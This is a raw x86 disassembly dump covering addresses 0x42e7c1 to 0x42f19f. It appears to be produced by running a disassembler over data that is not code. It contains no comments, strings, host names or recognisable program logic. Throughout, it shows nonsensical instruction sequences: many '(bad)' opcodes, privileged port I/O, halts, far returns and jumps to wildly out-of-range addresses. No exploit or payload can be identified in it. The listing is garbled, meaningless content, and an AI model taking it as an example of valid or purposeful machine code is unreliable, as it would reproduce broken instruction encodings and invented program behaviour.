  42e7c1:	les    ebp,FWORD PTR [edx+0x1ebe27f]
  42e7c7:	add    dh,dh
  42e7c9:	add    BYTE PTR [eax],al
  42e7cb:	add    BYTE PTR [ebx-0x472c8720],bh
  42e7d1:	and    eax,0x344c2d95
  42e7d6:	xchg   DWORD PTR [ecx],edx
  42e7d8:	lds    esi,FWORD PTR [esi+ecx*1-0x3266db18]
  42e7df:	xchg   edi,eax
  42e7e0:	aad    0x4e
  42e7e2:	dec    ebp
  42e7e3:	retf   
  42e7e4:	and    dh,BYTE PTR [ebx]
  42e7e6:	ja     0x42e7b8
  42e7e8:	push   ebx
  42e7e9:	loopne 0x42e777
  42e7eb:	call   eax
  42e7ed:	(bad)
  42e7f1:	fist   WORD PTR [ebx]
  42e7f3:	je     0x42e800
  42e7f5:	in     al,dx
  42e7f6:	dec    ebx
  42e7f7:	rol    BYTE PTR [edi],1
  42e7f9:	or     eax,0x25cd5019
  42e7fe:	in     eax,dx
  42e7ff:	xchg   ebx,eax
  42e800:	aas    
  42e801:	cmc    
  42e802:	(bad)  
  42e803:	shr    ecx,1
  42e805:	js     0x42e858
  42e807:	xlat   BYTE PTR ds:[ebx]
  42e808:	das    
  42e809:	adc    DWORD PTR [esi-0x639fb429],edi
  42e80f:	cld    
  42e810:	(bad)  
  42e811:	xor    DWORD PTR [eax],eax
  42e813:	in     al,dx
  42e814:	leave  
  42e815:	or     al,0x55
  42e817:	mov    eax,ds:0x4fb776ec
  42e81c:	out    0x78,al
  42e81e:	mov    ah,0xea
  42e820:	jno    0x42e80b
  42e822:	lods   eax,DWORD PTR ds:[esi]
  42e823:	cmc    
  42e824:	push   DWORD PTR [edi]
  42e826:	imul   edi,DWORD PTR [esi],0x45
  42e829:	inc    edx
  42e82a:	(bad)  
  42e82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e82c:	xor    bh,BYTE PTR [eax+0x17]
  42e82f:	sub    dh,BYTE PTR [ebp+eax*2-0x70]
  42e833:	stos   DWORD PTR es:[edi],eax
  42e834:	ins    BYTE PTR es:[edi],dx
  42e835:	mov    bh,0x82
  42e837:	xlat   BYTE PTR ds:[ebx]
  42e838:	arpl   WORD PTR [eax+0x42],di
  42e83b:	pop    esi
  42e83d:	ds aaa 
  42e83f:	mov    al,0xf6
  42e841:	(bad)  
  42e842:	arpl   WORD PTR [ecx-0x2e061e41],sp
  42e848:	fdiv   QWORD PTR [ecx-0x2f685ef]
  42e84e:	retf   
  42e84f:	dec    eax
  42e850:	int3   
  42e851:	jecxz  0x42e816
  42e853:	pop    eax
  42e854:	clc    
  42e855:	push   edi
  42e856:	sbb    esp,ecx
  42e858:	xchg   edi,eax
  42e859:	repz add eax,0x7fe4c428
  42e85f:	add    DWORD PTR [ebp+0x7e],ebx
  42e862:	jmp    0x296eaec4
  42e867:	out    0x7d,al
  42e869:	cmc    
  42e86a:	adc    BYTE PTR [edi+ecx*4-0x12b871a5],bh
  42e871:	int    0x26
  42e873:	ret    
  42e874:	stos   BYTE PTR es:[edi],al
  42e875:	out    0xfb,eax
  42e877:	(bad)  
  42e878:	fmul   QWORD PTR [edx]
  42e87a:	addr16 (bad) 
  42e87c:	and    ah,BYTE PTR [ebp-0x63a36950]
  42e882:	pop    edx
  42e883:	xlat   BYTE PTR ds:[ebx]
  42e884:	ins    BYTE PTR es:[edi],dx
  42e885:	xchg   edx,eax
  42e886:	xor    edi,DWORD PTR [esi]
  42e888:	sbb    ch,BYTE PTR ds:0xfb7174fe
  42e88f:	(bad)  
  42e890:	outs   dx,DWORD PTR ds:[esi]
  42e891:	xchg   ebp,eax
  42e892:	xor    DWORD PTR [eax-0x7480b71f],0x63
  42e899:	addr16 mov esi,0xe3a20310
  42e89f:	push   ebx
  42e8a0:	retf   
  42e8a1:	push   ds
  42e8a2:	leave  
  42e8a3:	leave  
  42e8a4:	ror    BYTE PTR [eax+eax*1+0x23],cl
  42e8a8:	call   0xf32e2d8d
  42e8ad:	push   0xfda2baef
  42e8b2:	dec    ebx
  42e8b3:	into   
  42e8b4:	dec    esi
  42e8b5:	mov    esi,0xd61e5489
  42e8ba:	dec    esp
  42e8bb:	add    bl,al
  42e8bd:	repz xor al,dl
  42e8c0:	dec    esi
  42e8c1:	jnp    0x42e8c3
	...
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xa8
  42e941:	popf   
  42e942:	test   DWORD PTR [eax+ebx*8],esp
  42e945:	in     al,dx
  42e946:	add    DWORD PTR [eax],eax
  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [edi],al
  42e94d:	add    BYTE PTR [edi+0x62],0xf5
  42e951:	je     0x42e9b8
  42e953:	and    ch,BYTE PTR ds:0x331f4bea
  42e959:	inc    edx
  42e95a:	push   cs
  42e95b:	push   cs
  42e95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e95d:	pop    esi
  42e95e:	xor    ecx,esi
  42e960:	sbb    BYTE PTR [ebp-0x24],0x20
  42e964:	and    DWORD PTR [edx-0x410afda1],ebp
  42e96a:	sub    BYTE PTR [esi+0x765af076],bl
  42e970:	test   BYTE PTR gs:[eax+0x4f],al
  42e974:	lahf   
  42e975:	leave  
  42e976:	cwde   
  42e977:	out    dx,eax
  42e978:	mov    bh,0xec
  42e97a:	cli    
  42e97b:	sti    
  42e97c:	mov    DWORD PTR [edx+eiz*2-0x23],0x730c3c39
  42e984:	lds    ecx,FWORD PTR [ecx-0x42]
  42e987:	fdivr  DWORD PTR [edx+0x175b064f]
  42e98d:	add    BYTE PTR [esi+0x1371de29],0x84
  42e994:	push   0x58
  42e996:	xchg   ecx,eax
  42e997:	mov    ds,ebp
  42e999:	jg     0x42e930
  42e99b:	or     eax,0x4d1e4eb2
  42e9a0:	inc    ecx
  42e9a1:	pop    ecx
  42e9a2:	loope  0x42ea08
  42e9a4:	cwde   
  42e9a5:	sub    BYTE PTR [edx+eax*1-0x45],dh
  42e9a9:	push   ss
  42e9aa:	gs pop eax
  42e9ac:	xchg   edi,eax
  42e9ad:	(bad)  
  42e9ae:	push   esp
  42e9af:	push   ds
  42e9b0:	rol    WORD PTR [ecx-0x66373663],0xf5
  42e9b8:	adc    ah,BYTE PTR [edx+0x5021cd19]
  42e9be:	inc    ebp
  42e9bf:	loope  0x42e9c2
  42e9c1:	jg     0x42e959
  42e9c3:	sub    al,0xf6
  42e9c5:	(bad)  
  42e9c6:	in     eax,dx
  42e9c7:	dec    edi
  42e9c8:	rol    BYTE PTR [eax],1
  42e9ca:	inc    ebx
  42e9cb:	cmp    ebx,DWORD PTR [edx+0x3b0f2c30]
  42e9d1:	popf   
  42e9d2:	push   ecx
  42e9d3:	xor    eax,DWORD PTR [ecx+0x4dd0b0ec]
  42e9d9:	mov    WORD PTR [ebx-0x3b6303af],fs
  42e9df:	add    BYTE PTR [ebx+0x41a87a78],cl
  42e9e5:	inc    ebp
  42e9e6:	or     eax,0xca24ea65
  42e9eb:	fucomip st,st(7)
  42e9ed:	aaa    
  42e9ee:	adc    DWORD PTR [ebx-0x2658b830],ebp
  42e9f4:	pop    ss
  42e9f5:	dec    ecx
  42e9f6:	add    BYTE PTR [ebp+eax*1-0x4b],bh
  42e9fa:	call   DWORD PTR [ebp+eax*4+0x5e]
  42e9fe:	dec    esp
  42e9ff:	sub    bh,BYTE PTR [edx-0x71]
  42ea02:	cli    
  42ea03:	sub    BYTE PTR [ebx+ebp*4+0x45],dh
  42ea07:	and    bl,dl
  42ea09:	mov    edi,DWORD PTR [ecx+0x74904791]
  42ea0f:	test   DWORD PTR [ebx-0x3ec38ffa],esp
  42ea15:	xor    esi,DWORD PTR [ebx+0x40caf585]
  42ea1b:	outs   dx,BYTE PTR ds:[esi]
  42ea1c:	sub    DWORD PTR [ebx+0x2],eax
  42ea1f:	jle    0x42ea52
  42ea21:	mov    ds:0xfc5f5d81,eax
  42ea26:	or     dh,ah
  42ea28:	cmp    ecx,DWORD PTR [esi-0x674c99b3]
  42ea2e:	out    dx,al
  42ea2f:	repz or ebx,DWORD PTR [eax]
  42ea32:	dec    edi
  42ea33:	aas    
  42ea34:	in     al,dx
  42ea35:	inc    eax
  42ea36:	jo     0x42ea16
  42ea38:	fcom   st(5)
  42ea3a:	cmp    edx,esi
  42ea3c:	jbe    0x42eaae
  42ea3e:	pop    ss
  42ea3f:	jnp    0x42eabb
  42ea41:	and    eax,0x0
	...
  42eab2:	add    BYTE PTR [eax],al
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eac1:	int    0x51
  42eac3:	add    al,0xce
  42eac5:	in     eax,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	test   BYTE PTR [eax],0x0
  42eacb:	add    BYTE PTR [esi],ch
  42eacd:	hlt    
  42eace:	lods   eax,DWORD PTR ds:[esi]
  42eacf:	mov    ah,0xaf
  42ead1:	ret    
  42ead2:	std    
  42ead3:	inc    ebp
  42ead4:	ror    DWORD PTR [edx],0x90
  42ead7:	mov    cl,0xe9
  42ead9:	adc    eax,0xdfcbd7df
  42eade:	jne    0x42ead1
  42eae0:	inc    edi
  42eae1:	or     DWORD PTR [esi-0x5a],esp
  42eae4:	dec    edx
  42eae5:	cmp    cl,0xcb
  42eae8:	stos   DWORD PTR es:[edi],eax
  42eae9:	stc    
  42eaea:	mov    ch,0xac
  42eaec:	sub    ebp,esi
  42eaee:	lds    edi,FWORD PTR [ebx-0x3d]
  42eaf1:	inc    ecx
  42eaf2:	dec    esi
  42eaf3:	mov    ecx,0x3e37eeec
  42eaf8:	rcl    BYTE PTR [ebx+ecx*2+0x646cd52c],1
  42eaff:	pop    esp
  42eb00:	jno    0x42ea96
  42eb02:	das    
  42eb03:	pop    esp
  42eb04:	sub    BYTE PTR [eax+0x5f0dd077],ch
  42eb0a:	xchg   ebx,ebp
  42eb0c:	pusha  
  42eb0d:	mov    cl,0x88
  42eb0f:	ds ret 0xac76
  42eb13:	test   eax,0x51a635ad
  42eb18:	add    esp,DWORD PTR [ecx+0x30fdc444]
  42eb1e:	xlat   BYTE PTR ds:[ebx]
  42eb1f:	pop    esi
  42eb20:	ret    0x9610
  42eb23:	test   al,0xe1
  42eb25:	mov    esp,DWORD PTR cs:[edi]
  42eb28:	adc    DWORD PTR [ecx+0x2c8a34d7],edi
  42eb2e:	aad    0x1d
  42eb30:	add    esp,DWORD PTR [ebp-0x7a]
  42eb33:	mov    ?,ebp
  42eb35:	sub    DWORD PTR [ebp-0x7b],edx
  42eb38:	mov    dl,cl
  42eb3a:	imul   ecx,ecx,0xffffffec
  42eb3d:	xor    cl,BYTE PTR [ebx+0x5c]
  42eb40:	jecxz  0x42ebaf
  42eb42:	sbb    al,0x28
  42eb44:	xchg   edx,eax
  42eb45:	(bad)  ss:[ebx+0x6e]
  42eb49:	cld    
  42eb4a:	retf   
  42eb4b:	addr16 inc esp
  42eb4d:	das    
  42eb4e:	jle    0x42eb84
  42eb50:	xchg   edx,eax
  42eb51:	mov    ecx,0x326b46ef
  42eb56:	push   ss
  42eb57:	mov    ah,0x1d
  42eb59:	imul   ecx,DWORD PTR [ebx-0x25],0x50
  42eb5d:	cmp    al,0xdf
  42eb5f:	xor    DWORD PTR ds:0x7c0897d1,ecx
  42eb65:	aaa    
  42eb66:	and    esi,ecx
  42eb68:	nop
  42eb69:	std    
  42eb6a:	fwait
  42eb6b:	inc    eax
  42eb6c:	lds    eax,FWORD PTR [edi]
  42eb6e:	repz mov dl,0xce
  42eb71:	mov    ebp,0xdd12f57d
  42eb76:	jmp    0x42ebbd
  42eb78:	jo     0x42ebe0
  42eb7a:	xor    al,0x6e
  42eb7c:	sbb    BYTE PTR [edi-0x650e82f4],ch
  42eb82:	test   al,0x2b
  42eb84:	pushf  
  42eb85:	jns    0x42eb97
  42eb87:	ins    BYTE PTR es:[edi],dx
  42eb88:	sbb    eax,0x3e260764
  42eb8d:	pop    ecx
  42eb8e:	outs   dx,BYTE PTR ds:[esi]
  42eb8f:	cmp    cl,al
  42eb91:	dec    edx
  42eb92:	test   ah,cl
  42eb94:	out    dx,al
  42eb95:	outs   dx,DWORD PTR ds:[esi]
  42eb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb97:	add    DWORD PTR [ecx+0x75],eax
  42eb9a:	jg     0x42eb8b
  42eb9c:	lods   eax,DWORD PTR ds:[esi]
  42eb9d:	(bad)  
  42eb9f:	inc    ebx
  42eba0:	in     al,0x9
  42eba2:	sub    dh,bl
  42eba4:	and    al,0x3
  42eba6:	div    DWORD PTR [edx+0x6d]
  42eba9:	(bad)  
  42ebaa:	mov    esi,0xc90435d1
  42ebaf:	mov    bl,0x41
  42ebb1:	fmul   DWORD PTR [edx]
  42ebb3:	or     al,0x66
  42ebb5:	add    eax,0xe0fc362a
  42ebba:	lahf   
  42ebbb:	int    0xe0
  42ebbd:	ret    
  42ebbe:	js     0x42eb96
  42ebc0:	cmp    edx,esp
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x29a1e069]
  42ec43:	cld    
  42ec44:	(bad)  
  42ec45:	out    dx,al
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    al,bh
  42ec4d:	inc    esp
  42ec4e:	pop    edi
  42ec4f:	clc    
  42ec50:	cmp    al,0x8b
  42ec52:	dec    ebp
  42ec53:	mov    bl,0xe
  42ec55:	pushf  
  42ec56:	adc    al,0x16
  42ec58:	inc    ecx
  42ec59:	ins    DWORD PTR es:[edi],dx
  42ec5a:	(bad)  
  42ec5b:	(bad)  
  42ec5c:	adc    eax,0xc6db2dd9
  42ec61:	ret    0x9469
  42ec64:	addr16 fs in al,0xe9
  42ec68:	mov    edx,0xc1d6ce1e
  42ec6d:	dec    eax
  42ec6e:	cmp    BYTE PTR [eax+0x5a36a7bb],ah
  42ec74:	lea    ebx,[edx+edx*4]
  42ec77:	jle    0x42ec36
  42ec79:	int3   
  42ec7a:	sbb    eax,0x4382839a
  42ec7f:	fs cwde 
  42ec81:	dec    edi
  42ec82:	daa    
  42ec83:	push   ebx
  42ec84:	dec    esp
  42ec85:	adc    BYTE PTR [edi-0x70],dh
  42ec88:	(bad)  [esi]
  42ec8a:	mov    BYTE PTR [esi],bh
  42ec8c:	(bad)  
  42ec8d:	jg     0x42eceb
  42ec8f:	fidiv  WORD PTR [edi]
  42ec91:	mov    ah,0xf3
  42ec93:	mov    ds:0x182fe260,eax
  42ec98:	ret    0xc6d3
  42ec9b:	xchg   ebx,eax
  42ec9c:	(bad)  
  42ec9d:	clc    
  42ec9e:	std    
  42ec9f:	pop    es
  42eca0:	jno    0x42ed1c
  42eca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eca3:	pop    ebx
  42eca4:	cs or  al,0x9b
  42eca7:	mov    ds:0x79975cea,al
  42ecac:	mov    eax,ds:0x188b99c7
  42ecb1:	jmp    0x42ec3a
  42ecb3:	dec    esi
  42ecb4:	add    bh,BYTE PTR ds:0xe8da1744
  42ecba:	xchg   bh,cl
  42ecbc:	push   ebp
  42ecbd:	fs jb  0x42ec6b
  42ecc0:	push   es
  42ecc1:	xchg   ebx,eax
  42ecc2:	or     bh,BYTE PTR [ebp-0x6961c694]
  42ecc8:	fsubr  QWORD PTR [ebx+ecx*1-0x367c1347]
  42eccf:	mov    edx,0xed8b5690
  42ecd4:	sub    al,0xa4
  42ecd6:	mov    ds:0xe17633c2,al
  42ecdb:	mov    dh,0x98
  42ecdd:	pop    esi
  42ecde:	sbb    BYTE PTR ds:0x8c00cac4,ch
  42ece4:	sub    eax,0xa53d5ded
  42ece9:	adc    DWORD PTR [ecx+eiz*4+0x5645da48],edi
  42ecf0:	lds    di,DWORD PTR [eax+0x57]
  42ecf4:	mov    dl,0x89
  42ecf6:	les    ecx,FWORD PTR [esi]
  42ecf8:	adc    BYTE PTR [edi],al
  42ecfa:	jecxz  0x42eccc
  42ecfc:	pusha  
  42ecfd:	and    dl,dl
  42ecff:	lock addr16 mov ah,0xe9
  42ed03:	sbb    DWORD PTR [ebp-0x1e],eax
  42ed06:	div    dl
  42ed08:	mov    esi,0x97382a97
  42ed0d:	mov    ds,ebp
  42ed0f:	aad    0xa
  42ed11:	sahf   
  42ed12:	fnstsw WORD PTR ds:0x247c6f0e
  42ed18:	jns    0x42ed6c
  42ed1a:	add    BYTE PTR [ecx+0x45],ah
  42ed1d:	push   ss
  42ed1e:	and    DWORD PTR [ebx+edx*1+0x1f52b210],0x7cd5222a
  42ed29:	jmp    0x315f28ee
  42ed2e:	jge    0x42ecd6
  42ed30:	mov    esi,0xbc2777b6
  42ed35:	lahf   
  42ed36:	test   ecx,0x62bef6fd
  42ed3c:	mov    ds:0xe40dea86,al
  42ed41:	sub    eax,0x0
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x2b372e63
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [ebx+0x33],dh
  42edce:	xchg   esp,eax
  42edcf:	mov    ah,0xd3
  42edd1:	mov    bl,0x38
  42edd3:	inc    esi
  42edd4:	push   ebx
  42edd5:	and    edx,ebx
  42edd7:	mov    al,0x74
  42edd9:	push   ss
  42edda:	sub    al,dh
  42eddc:	ds inc ebx
  42edde:	call   DWORD PTR [edi]
  42ede0:	jb     0x42ed82
  42ede2:	stos   DWORD PTR es:[edi],eax
  42ede3:	loop   0x42ee35
  42ede5:	pop    ds
  42ede6:	dec    ebp
  42ede7:	mov    BYTE PTR [ebx+0x48ef7fc8],bh
  42eded:	jns    0x42ed94
  42edef:	les    esi,FWORD PTR [ebx]
  42edf1:	xchg   edi,eax
  42edf2:	int3   
  42edf3:	push   esp
  42edf4:	fs jp  0x42ee3d
  42edf7:	or     al,0xa9
  42edf9:	and    esi,ebx
  42edfb:	fistp  QWORD PTR [edi-0x7bc2c27c]
  42ee01:	int    0xf0
  42ee03:	adc    ebp,DWORD PTR [edx-0x19cb1f1c]
  42ee09:	jecxz  0x42edf5
  42ee0b:	fisub  DWORD PTR [ebx+0x4d]
  42ee0e:	pextrw edi,(bad),0xc5
  42ee10:	mov    eax,0xe253e689
  42ee15:	push   ecx
  42ee16:	push   ds
  42ee17:	inc    esp
  42ee18:	jl     0x42edf5
  42ee1a:	les    ebx,FWORD PTR [eax]
  42ee1c:	push   cs
  42ee1d:	jno    0x42eda0
  42ee1f:	and    al,0xd3
  42ee21:	sahf   
  42ee22:	ret    
  42ee23:	fs push es
  42ee25:	or     ah,BYTE PTR [esi+0x272ae69f]
  42ee2b:	out    0x88,al
  42ee2d:	and    al,0xad
  42ee2f:	hlt    
  42ee30:	popf   
  42ee31:	jle    0x42ee66
  42ee33:	ja     0x42ee87
  42ee35:	sar    DWORD PTR [esi-0x5183d94e],1
  42ee3b:	mov    esp,0x838bdb0
  42ee40:	xor    dl,BYTE PTR [edx]
  42ee42:	push   ss
  42ee43:	les    eax,FWORD PTR [ecx+0x6903d1cd]
  42ee49:	gs iret 
  42ee4b:	jnp    0x42ee40
  42ee4d:	es jmp 0x42ee41
  42ee50:	pushf  
  42ee51:	sbb    al,BYTE PTR [ecx-0x52f6168d]
  42ee57:	lahf   
  42ee58:	cmpps  xmm3,xmm3,0x3d
  42ee5c:	sar    DWORD PTR [edx],0xfc
  42ee5f:	test   DWORD PTR [ebp-0x6ed0ef03],ecx
  42ee65:	mov    ds:0xde813b3a,eax
  42ee6a:	xchg   BYTE PTR [esi],dh
  42ee6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee6d:	sbb    BYTE PTR ds:[ebp+0x5],bh
  42ee71:	addr16 cli 
  42ee73:	add    DWORD PTR ds:0x290071a9,ecx
  42ee79:	jns    0x42edfe
  42ee7b:	and    eax,0xc91bb85f
  42ee80:	inc    ebx
  42ee81:	mov    edx,0xb2505c8
  42ee86:	rcl    BYTE PTR [edx],0xc9
  42ee89:	ja     0x42eedd
  42ee8b:	fsubr  DWORD PTR [esi+0x7a2cc27b]
  42ee91:	not    BYTE PTR [ecx-0x62]
  42ee94:	outs   dx,DWORD PTR ds:[esi]
  42ee95:	sub    ecx,DWORD PTR [edx+0x706f6e57]
  42ee9b:	or     eax,0xc69ecbdd
  42eea0:	and    BYTE PTR [ebx+0xc],bl
  42eea3:	int3   
  42eea4:	pop    ecx
  42eea5:	test   ah,ah
  42eea7:	repnz sbb eax,0xfc881956
  42eead:	in     al,0x4f
  42eeaf:	arpl   WORD PTR [ebx],cx
  42eeb1:	ror    cl,1
  42eeb3:	in     eax,0x58
  42eeb5:	sub    ch,0x86
  42eeb8:	xchg   BYTE PTR [edx-0x2],dl
  42eebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eebc:	scas   al,BYTE PTR es:[edi]
  42eebd:	fwait
  42eebe:	fs enter 0x15fd,0x0
	...
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz xchg esp,esp
  42ef42:	jbe    0x42ef38
  42ef44:	mov    al,0xf0
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	test   BYTE PTR [eax],0x0
  42ef4b:	add    BYTE PTR [eax+0x69],ah
  42ef4e:	ret    
  42ef4f:	imul   eax,DWORD PTR [esi+ebp*8+0x20],0x36f064d5
  42ef57:	data16 adc al,0x63
  42ef5a:	xchg   ebp,eax
  42ef5b:	xor    edi,eax
  42ef5d:	xchg   DWORD PTR [ecx*2+0x1319ca63],ecx
  42ef64:	cmp    BYTE PTR ds:0xdd629bb3,ah
  42ef6a:	xor    eax,DWORD PTR [edx+0x2716b4e9]
  42ef70:	pop    eax
  42ef71:	mov    ebx,0x1ac07f87
  42ef76:	cdq    
  42ef77:	xchg   ebx,eax
  42ef78:	aam    0xb3
  42ef7a:	push   ebp
  42ef7b:	jp     0x42efca
  42ef7d:	loopne 0x42efb1
  42ef7f:	lods   al,BYTE PTR ds:[esi]
  42ef80:	int3   
  42ef81:	or     eax,0xaaa31379
  42ef86:	int    0x29
  42ef88:	or     BYTE PTR [edi],al
  42ef8a:	mov    edx,es
  42ef8c:	pop    ecx
  42ef8d:	ins    DWORD PTR es:[edi],dx
  42ef8e:	ffreep st(4)
  42ef90:	mov    ds:0xda9c5df8,al
  42ef95:	mov    esp,0xcf59367
  42ef9a:	mov    esp,0x2a417ed8
  42ef9f:	add    edi,ebp
  42efa1:	cmp    BYTE PTR [ecx],cl
  42efa3:	xor    BYTE PTR [ecx],dl
  42efa5:	fsub   st,st(2)
  42efa7:	mov    esi,edi
  42efa9:	adc    DWORD PTR [esi+0x66],edx
  42efac:	jns    0x42efaa
  42efae:	ja     0x42f026
  42efb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efb1:	push   ebx
  42efb2:	and    eax,0x4bdc73d0
  42efb7:	and    DWORD PTR [ebx-0x3e0212c8],esi
  42efbd:	push   ds
  42efbe:	pop    ebp
  42efbf:	test   DWORD PTR [esi-0x1b],esi
  42efc2:	cmp    BYTE PTR [ebx+0x5e],ah
  42efc5:	cwde   
  42efc6:	pop    edx
  42efc7:	dec    esp
  42efc8:	scas   al,BYTE PTR es:[edi]
  42efc9:	icebp  
  42efca:	xchg   DWORD PTR [ecx-0x1f],ecx
  42efcd:	je     0x42efdd
  42efcf:	in     eax,dx
  42efd0:	fsub   QWORD PTR [edi+0x28]
  42efd3:	mov    esp,0x19c81a1c
  42efd8:	pop    ds
  42efd9:	add    eax,0xca8a7c51
  42efde:	add    ch,dh
  42efe0:	add    BYTE PTR [ebp+0x69168174],cl
  42efe6:	and    al,0x2e
  42efe8:	pop    DWORD PTR [edx-0x36]
  42efeb:	jle    0x42efdc
  42efed:	cmc    
  42efee:	outs   dx,BYTE PTR ds:[esi]
  42efef:	fwait
  42eff0:	adc    BYTE PTR ds:0x93ae42d7,al
  42eff6:	or     cl,dh
  42eff8:	or     al,0x81
  42effa:	jge    0x42efcc
  42effc:	jns    0x42ef8d
  42effe:	ror    ah,1
  42f000:	aad    0x18
  42f002:	ret    0x63ae
  42f005:	push   0xffffff96
  42f007:	sbb    BYTE PTR [esi-0x33],cl
  42f00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f00b:	sbb    eax,0x3269dab0
  42f010:	in     eax,0xa6
  42f012:	xor    al,0x64
  42f014:	jae    0xe405a3ca
  42f01a:	shr    edi,cl
  42f01c:	repz pop ecx
  42f01e:	xor    ecx,DWORD PTR [ecx+0x71cc946a]
  42f024:	mul    DWORD PTR [eax+0x1bdefe8e]
  42f02a:	cmp    al,dh
  42f02c:	pop    ds
  42f02d:	xchg   BYTE PTR [ebx],al
  42f02f:	out    dx,eax
  42f030:	cli    
  42f031:	cwde   
  42f032:	pop    ebx
  42f033:	retf   0xcd1d
  42f036:	cmc    
  42f037:	jmp    0x42efb9
  42f039:	arpl   WORD PTR ds:0xa24294ce,dx
  42f03f:	lods   al,BYTE PTR ds:[esi]
  42f040:	cmp    dl,BYTE PTR [edx+0x0]
	...
  42f0b2:	add    BYTE PTR [eax],al
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c1:	or     eax,esi
  42f0c3:	fisub  DWORD PTR [esi-0x9fffe0f]
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR [ebx],dh
  42f0cd:	inc    edx
  42f0ce:	lahf   
  42f0cf:	inc    ecx
  42f0d0:	mov    cl,BYTE PTR [edx-0x1f]
  42f0d3:	inc    eax
  42f0d4:	dec    edi
  42f0d5:	and    dh,bh
  42f0d7:	dec    ecx
  42f0d8:	mov    dl,0xf5
  42f0da:	fwait
  42f0db:	or     al,0xf7
  42f0dd:	sub    eax,0xe9ea40b
  42f0e2:	sbb    eax,0xd7f4d599
  42f0e7:	cmp    eax,0x8cd03a57
  42f0ec:	(bad)  
  42f0ed:	(bad)  
  42f0ee:	cmp    esi,DWORD PTR [edx+eiz*1+0xb]
  42f0f2:	retf   0xcc09
  42f0f5:	ja     0x42f0fc
  42f0f7:	stos   DWORD PTR es:[edi],eax
  42f0f8:	mov    dl,0xb6
  42f0fa:	ds popf 
  42f0fc:	adc    al,ch
  42f0fe:	sub    al,0x7c
  42f100:	sbb    eax,0x24347657
  42f105:	push   esp
  42f106:	mov    cl,0x2f
  42f108:	mov    edx,gs
  42f10a:	dec    ecx
  42f10b:	pop    esp
  42f10c:	dec    ebx
  42f10d:	ins    BYTE PTR es:[edi],dx
  42f10e:	jo     0x42f161
  42f110:	mov    cl,0x2c
  42f112:	mov    ebx,0xe13099bd
  42f117:	xor    al,cl
  42f119:	lahf   
  42f11a:	or     al,0x25
  42f11c:	rcl    ah,1
  42f11e:	sbb    ecx,0x20
  42f121:	cwde   
  42f122:	dec    esp
  42f123:	test   eax,0xd7c2e277
  42f128:	cmp    BYTE PTR [esi],bh
  42f12a:	mov    ch,0xb1
  42f12c:	or     dl,BYTE PTR [esi-0x3139e9e]
  42f132:	je     0x42f147
  42f134:	and    eax,DWORD PTR gs:[eax+0x92b4c06]
  42f13b:	popa   
  42f13c:	push   ss
  42f13d:	inc    eax
  42f13e:	cmp    dh,bh
  42f140:	(bad)  
  42f141:	sub    DWORD PTR [ecx+esi*2],ecx
  42f144:	mov    dh,0x71
  42f146:	xchg   DWORD PTR [edx+0x699fbb09],eax
  42f14c:	and    dl,BYTE PTR [edi-0x64]
  42f14f:	(bad)  
  42f150:	fsubp  st(6),st
  42f152:	mov    esp,0xd09d432c
  42f157:	mov    ds:0x3d04c7fa,al
  42f15c:	sahf   
  42f15d:	jns    0x42f15a
  42f15f:	loopne 0x42f185
  42f161:	sub    BYTE PTR cs:0x97846359,bh
  42f168:	pusha  
  42f169:	or     BYTE PTR [eax-0x62bd74dd],bh
  42f16f:	mov    dh,0x0
  42f171:	outs   dx,DWORD PTR ds:[esi]
  42f172:	or     eax,0x41e35b31
  42f177:	retf   0xcf77
  42f17a:	mov    eax,ds:0x2ea9e708
  42f17f:	dec    esi
  42f180:	jl     0x42f1c0
  42f182:	and    dl,bh
  42f184:	sub    eax,0x85dd2eec
  42f189:	fild   WORD PTR [eax-0x62]
  42f18c:	mov    ds,WORD PTR [esi-0x27]
  42f18f:	ds push 0x6da9a9ef
  42f195:	pop    ebp
  42f196:	stos   BYTE PTR es:[edi],al
  42f197:	push   esi
  42f198:	icebp  
  42f199:	out    0x63,al
  42f19b:	je     0x42f141
  42f19d:	fucom  st(3)
  42f19f:	shl    edi,cl
